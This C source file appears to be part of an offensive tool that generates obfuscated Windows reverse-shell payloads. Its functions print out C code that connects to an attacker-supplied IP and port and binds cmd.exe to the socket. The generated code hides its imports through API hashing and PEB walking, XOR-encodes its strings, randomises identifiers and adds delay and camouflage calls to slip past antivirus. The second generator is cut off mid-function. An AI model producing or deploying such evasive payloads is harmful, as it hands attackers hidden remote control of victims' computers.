#include "struct.h"
#include <time.h>  

//================================================================================================================================================================//
// generate rundom name 
//================================================================================================================================================================//
void generate_random_string(char* buffer, int len) {
    static const char alphanum[] =
        "ABCDEFGHIJLMNOPQRSTUVWXYZ"
        "abcdefghijlmnopqrstuvwxyz";

    for (int i = 0; i < len - 1; ++i) {
        buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }
    buffer[len - 1] = '\0';
}


//================================================================================================================================================================//
// obfuscated code with deley  
//================================================================================================================================================================//

void obf_deley_1_tcp_3_time(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    srand((unsigned int)time(NULL));
    

    // Random name generation for variables and functions
    char random_func_name[10], random_var_name[10], random_helper_name[10];
    char random_toUpper_name[10], random_memcpy_name[10], random_seed_name[10];
    char random_obf_func[10], random_zero_func[10], random_delay_func[10];
    char random_connect_func[10], random_init_func[10];

    generate_random_string(random_func_name, sizeof(random_func_name));
    generate_random_string(random_var_name, sizeof(random_var_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_memcpy_name, sizeof(random_memcpy_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_zero_func, sizeof(random_zero_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_connect_func, sizeof(random_connect_func));
    generate_random_string(random_init_func, sizeof(random_init_func));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15], random_iatcamouflage_name[8];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random pointer names
    char pWSAStartup_name[9], pWSASocketA_name[9], pinet_pton_name[9];
    char phtons_name[9], pconnect_name[9], pclosesocket_name[9];
    char pWSACleanup_name[9], pCreateProcessA_name[9], pNtWait_name[9];
    char pNtDelay_name[9], pNtClose_name[9], pLoadLib_name[9];

    generate_random_string(pWSAStartup_name, sizeof(pWSAStartup_name));
    generate_random_string(pWSASocketA_name, sizeof(pWSASocketA_name));
    generate_random_string(pinet_pton_name, sizeof(pinet_pton_name));
    generate_random_string(phtons_name, sizeof(phtons_name));
    generate_random_string(pconnect_name, sizeof(pconnect_name));
    generate_random_string(pclosesocket_name, sizeof(pclosesocket_name));
    generate_random_string(pWSACleanup_name, sizeof(pWSACleanup_name));
    generate_random_string(pCreateProcessA_name, sizeof(pCreateProcessA_name));
    generate_random_string(pNtWait_name, sizeof(pNtWait_name));
    generate_random_string(pNtDelay_name, sizeof(pNtDelay_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pLoadLib_name, sizeof(pLoadLib_name));

    // Random names for hashing definitions
    char kernel32_hash_name[11], ntdll_hash_name[12], loadlibrarya_hash_name[11];
    char wsastartup_hash_name[11], wsasocketa_hash_name[12], inet_pton_hash_name[12];
    char htons_hash_name[10], connect_hash_name[11], closesocket_hash_name[11];
    char wsacleanup_hash_name[13], createprocessa_hash_name[15], ntwait_hash_name[14];
    char ntdelay_hash_name[8], ntclose_hash_name[12];

    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(wsastartup_hash_name, sizeof(wsastartup_hash_name));
    generate_random_string(wsasocketa_hash_name, sizeof(wsasocketa_hash_name));
    generate_random_string(inet_pton_hash_name, sizeof(inet_pton_hash_name));
    generate_random_string(htons_hash_name, sizeof(htons_hash_name));
    generate_random_string(connect_hash_name, sizeof(connect_hash_name));
    generate_random_string(closesocket_hash_name, sizeof(closesocket_hash_name));
    generate_random_string(wsacleanup_hash_name, sizeof(wsacleanup_hash_name));
    generate_random_string(createprocessa_hash_name, sizeof(createprocessa_hash_name));
    generate_random_string(ntwait_hash_name, sizeof(ntwait_hash_name));
    generate_random_string(ntdelay_hash_name, sizeof(ntdelay_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));

    // Random typedef names
    char WSAStartup_typedef[12], WSASocketA_typedef[12], inet_pton_typedef[12];
    char htons_typedef[12], connect_typedef[12], closesocket_typedef[12];
    char WSACleanup_typedef[12], CreateProcessA_typedef[12], NtWait_typedef[12];
    char NtDelay_typedef[12], NtClose_typedef[12], LoadLibraryA_typedef[12];

    generate_random_string(WSAStartup_typedef, sizeof(WSAStartup_typedef));
    generate_random_string(WSASocketA_typedef, sizeof(WSASocketA_typedef));
    generate_random_string(inet_pton_typedef, sizeof(inet_pton_typedef));
    generate_random_string(htons_typedef, sizeof(htons_typedef));
    generate_random_string(connect_typedef, sizeof(connect_typedef));
    generate_random_string(closesocket_typedef, sizeof(closesocket_typedef));
    generate_random_string(WSACleanup_typedef, sizeof(WSACleanup_typedef));
    generate_random_string(CreateProcessA_typedef, sizeof(CreateProcessA_typedef));
    generate_random_string(NtWait_typedef, sizeof(NtWait_typedef));
    generate_random_string(NtDelay_typedef, sizeof(NtDelay_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));

    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s               0x84BD0AA5\n"
        "#define %s                  0xC9D1067D\n"
        "#define %s           0x0E32C08B\n"
        "#define %s             0xB703C453\n"
        "#define %s             0x5F3B12CA\n"
        "#define %s              0xBD120405\n"
        "#define %s                  0x17387BA1\n"
        "#define %s                0x13BF4FDF\n"
        "#define %s            0xF77E6C94\n"
        "#define %s             0x9CA98668\n"
        "#define %s         0x579FB1E9\n"
        "#define %s  0x2131236C\n"
        "#define %s                0x50DCFD5A\n"
        "#define %s       0x7E1EA2ED\n\n"
        "typedef int (WINAPI* %s)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* %s)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef int (WSAAPI* %s)(INT, PCSTR, PVOID);\n"
        "typedef u_short(WINAPI* %s)(u_short);\n"
        "typedef int (WINAPI* %s)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* %s)(SOCKET);\n"
        "typedef int (WINAPI* %s)(void);\n"
        "typedef BOOL(WINAPI* %s)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* %s)(LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n\n"
        "#define INITIAL_HASH 5429\n"
        "#define INITIAL_SEED 6\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY		pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD						FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD						FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD						FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB					pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB					pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char pkx[] = \"%s\";\n"
        "char hpi[] = {%s};\n"
        "char hcm[] = {%s};\n"
        "char ws2[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n\n"
        "void %s(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "void %s(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "void %s() {\n"
        "    %s((char*)hcm, sizeof(hcm), pkx, sizeof(pkx));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -50000;\n"
        "    int i = 0;\n"
        "    while (1) {\n"
        "        WSADATA wsaData;\n"
        "        p%s(MAKEWORD(2, 2), &wsaData);\n"
        "        SOCKET sock = p%s(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "        if (sock == INVALID_SOCKET) {\n"
        "            p%s();\n"
        "        }\n"
        "        struct sockaddr_in server;\n"
        "        server.sin_family = AF_INET;\n"
        "        server.sin_port = p%s(%d);\n"
        "        %s((char*)hpi, sizeof(hpi), pkx, sizeof(pkx));\n"
        "        p%s(AF_INET, hpi, &server.sin_addr);\n"
        "        if (p%s(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {\n"
        "            p%s(sock);\n"
        "            p%s();\n"
        "        }\n"
        "        STARTUPINFO si;\n"
        "        PROCESS_INFORMATION pi;\n"
        "        %s(&si, sizeof(si));\n"
        "        si.cb = sizeof(si);\n"
        "        si.dwFlags = STARTF_USESTDHANDLES;\n"
        "        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;\n"
        "        p%s(NULL, hcm, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n"
        "        i++;\n"
        "        if (i == 3) {\n"
        "            p%s(pi.hProcess, FALSE, &timeout);\n"
        "            p%s(pi.hProcess);\n"
        "            p%s(pi.hThread);\n"
        "            p%s(sock);\n"
        "            p%s();\n"
        "            break;\n"
        "        }\n"
        "        else {\n"
        "            p%s(pi.hProcess, FALSE, NULL);\n"
        "            p%s(pi.hProcess);\n"
        "            p%s(pi.hThread);\n"
        "            p%s(sock);\n"
        "            p%s();\n"
        "            %s(0.1);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE pkn = %s(%s);\n"
        "    HMODULE pnd = %s(%s);\n"
        "    %s p%s = (%s)%s(pkn, %s);\n"
        "    %s((char*)ws2, sizeof(ws2), pkx, sizeof(pkx));\n"
        "    HMODULE phw = p%s(ws2);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(pkn, %s);\n"
        "    p%s = (%s)%s(pnd, %s);\n"
        "    p%s = (%s)%s(pnd, %s);\n"
        "    p%s = (%s)%s(pnd, %s);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE , HINSTANCE , LPSTR , int ) {\n"
        "    %s();\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        kernel32_hash_name,
        ntdll_hash_name,
        loadlibrarya_hash_name,
        wsastartup_hash_name,
        wsasocketa_hash_name,
        inet_pton_hash_name,
        htons_hash_name,
        connect_hash_name,
        closesocket_hash_name,
        wsacleanup_hash_name,
        createprocessa_hash_name,
        ntwait_hash_name,
        ntdelay_hash_name,
        ntclose_hash_name,
        WSAStartup_typedef,
        WSASocketA_typedef,
        inet_pton_typedef,
        htons_typedef,
        connect_typedef,
        closesocket_typedef,
        WSACleanup_typedef,
        CreateProcessA_typedef,
        LoadLibraryA_typedef,
        NtWait_typedef,
        NtDelay_typedef,
        NtClose_typedef,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_obf_func,
        xkey, obf_ip, obf_cmd, obf_ws2dll,
        WSAStartup_typedef, pWSAStartup_name,
        WSASocketA_typedef, pWSASocketA_name,
        inet_pton_typedef, pinet_pton_name,
        htons_typedef, phtons_name,
        connect_typedef, pconnect_name,
        closesocket_typedef, pclosesocket_name,
        WSACleanup_typedef, pWSACleanup_name,
        CreateProcessA_typedef, pCreateProcessA_name,
        NtWait_typedef, pNtWait_name,
        NtDelay_typedef, pNtDelay_name,
        NtClose_typedef, pNtClose_name,
        LoadLibraryA_typedef, pLoadLib_name,
        random_zero_func,
        random_delay_func,
        pNtDelay_name,
        random_connect_func,
        random_obf_func,
        pWSAStartup_name,
        pWSASocketA_name,
        pWSACleanup_name,
        phtons_name, port,
        random_obf_func,
        pinet_pton_name,
        pconnect_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_zero_func,
        pCreateProcessA_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pWSACleanup_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_delay_func,
        random_init_func,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLib_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func,
        pLoadLib_name,
        pWSAStartup_name, WSAStartup_typedef, random_getproc_name, wsastartup_hash_name,
        pWSASocketA_name, WSASocketA_typedef, random_getproc_name, wsasocketa_hash_name,
        pinet_pton_name, inet_pton_typedef, random_getproc_name, inet_pton_hash_name,
        phtons_name, htons_typedef, random_getproc_name, htons_hash_name,
        pconnect_name, connect_typedef, random_getproc_name, connect_hash_name,
        pclosesocket_name, closesocket_typedef, random_getproc_name, closesocket_hash_name,
        pWSACleanup_name, WSACleanup_typedef, random_getproc_name, wsacleanup_hash_name,
        pCreateProcessA_name, CreateProcessA_typedef, random_getproc_name, createprocessa_hash_name,
        pNtWait_name, NtWait_typedef, random_getproc_name, ntwait_hash_name,
        pNtDelay_name, NtDelay_typedef, random_getproc_name, ntdelay_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_init_func,
        random_delay_func,
        random_connect_func
    );
}
void obf_deley_2_tcp__time_dll(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_func_name[10], random_var_name[10], random_helper_name[10];
    char random_toUpper_name[10], random_memcpy_name[10], random_seed_name[10];
    char random_obf_func[10], random_zero_func[10], random_delay_func[10];
    char random_connect_func[10], random_init_func[10];

    generate_random_string(random_func_name, sizeof(random_func_name));
    generate_random_string(random_var_name, sizeof(random_var_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_memcpy_name, sizeof(random_memcpy_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_zero_func, sizeof(random_zero_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_connect_func, sizeof(random_connect_func));
    generate_random_string(random_init_func, sizeof(random_init_func));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pWSAStartup_name[9], pWSASocketA_name[9], pinet_pton_name[9];
    char phtons_name[9], pconnect_name[9], pclosesocket_name[9];
    char pWSACleanup_name[9], pCreateProcessA_name[9], pNtWait_name[9];
    char pNtDelay_name[9], pNtClose_name[9], pLoadLib_name[9];

    generate_random_string(pWSAStartup_name, sizeof(pWSAStartup_name));
    generate_random_string(pWSASocketA_name, sizeof(pWSASocketA_name));
    generate_random_string(pinet_pton_name, sizeof(pinet_pton_name));
    generate_random_string(phtons_name, sizeof(phtons_name));
    generate_random_string(pconnect_name, sizeof(pconnect_name));
    generate_random_string(pclosesocket_name, sizeof(pclosesocket_name));
    generate_random_string(pWSACleanup_name, sizeof(pWSACleanup_name));
    generate_random_string(pCreateProcessA_name, sizeof(pCreateProcessA_name));
    generate_random_string(pNtWait_name, sizeof(pNtWait_name));
    generate_random_string(pNtDelay_name, sizeof(pNtDelay_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pLoadLib_name, sizeof(pLoadLib_name));

    // Random names for hashing definitions
    char kernel32_hash_name[11], ntdll_hash_name[12], loadlibrarya_hash_name[11];
    char wsastartup_hash_name[11], wsasocketa_hash_name[12], inet_pton_hash_name[12];
    char htons_hash_name[10], connect_hash_name[11], closesocket_hash_name[11];
    char wsacleanup_hash_name[13], createprocessa_hash_name[15], ntwait_hash_name[14];
    char ntdelay_hash_name[8], ntclose_hash_name[12];

    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(wsastartup_hash_name, sizeof(wsastartup_hash_name));
    generate_random_string(wsasocketa_hash_name, sizeof(wsasocketa_hash_name));
    generate_random_string(inet_pton_hash_name, sizeof(inet_pton_hash_name));
    generate_random_string(htons_hash_name, sizeof(htons_hash_name));
    generate_random_string(connect_hash_name, sizeof(connect_hash_name));
    generate_random_string(closesocket_hash_name, sizeof(closesocket_hash_name));
    generate_random_string(wsacleanup_hash_name, sizeof(wsacleanup_hash_name));
    generate_random_string(createprocessa_hash_name, sizeof(createprocessa_hash_name));
    generate_random_string(ntwait_hash_name, sizeof(ntwait_hash_name));
    generate_random_string(ntdelay_hash_name, sizeof(ntdelay_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));

    // Random typedef names
    char WSAStartup_typedef[12], WSASocketA_typedef[12], inet_pton_typedef[12];
    char htons_typedef[12], connect_typedef[12], closesocket_typedef[12];
    char WSACleanup_typedef[12], CreateProcessA_typedef[12], NtWait_typedef[12];
    char NtDelay_typedef[12], NtClose_typedef[12], LoadLibraryA_typedef[12];

    generate_random_string(WSAStartup_typedef, sizeof(WSAStartup_typedef));
    generate_random_string(WSASocketA_typedef, sizeof(WSASocketA_typedef));
    generate_random_string(inet_pton_typedef, sizeof(inet_pton_typedef));
    generate_random_string(htons_typedef, sizeof(htons_typedef));
    generate_random_string(connect_typedef, sizeof(connect_typedef));
    generate_random_string(closesocket_typedef, sizeof(closesocket_typedef));
    generate_random_string(WSACleanup_typedef, sizeof(WSACleanup_typedef));
    generate_random_string(CreateProcessA_typedef, sizeof(CreateProcessA_typedef));
    generate_random_string(NtWait_typedef, sizeof(NtWait_typedef));
    generate_random_string(NtDelay_typedef, sizeof(NtDelay_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));

    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "#define %s               0xA5E086A2\n"
        "#define %s                  0x5251037A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s             0x5925BC50\n"
        "#define %s             0xE2F31987\n"
        "#define %s              0xB9D29D42\n"
        "#define %s                  0xBC98541E\n"
        "#define %s                0x068FB8DC\n"
        "#define %s            0x65188A91\n"
        "#define %s             0xE6AD20A5\n"
        "#define %s         0x4CA64FE6\n"
        "#define %s  0xCB42C5A9\n"
        "#define %s                0x1236E2D7\n"
        "#define %s       0xF20D7F2A\n\n"
        "typedef int (WINAPI* %s)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* %s)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef int (WSAAPI* %s)(INT, PCSTR, PVOID);\n"
        "typedef u_short(WINAPI* %s)(u_short);\n"
        "typedef int (WINAPI* %s)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* %s)(SOCKET);\n"
        "typedef int (WINAPI* %s)(void);\n"
        "typedef BOOL(WINAPI* %s)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* %s)(LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
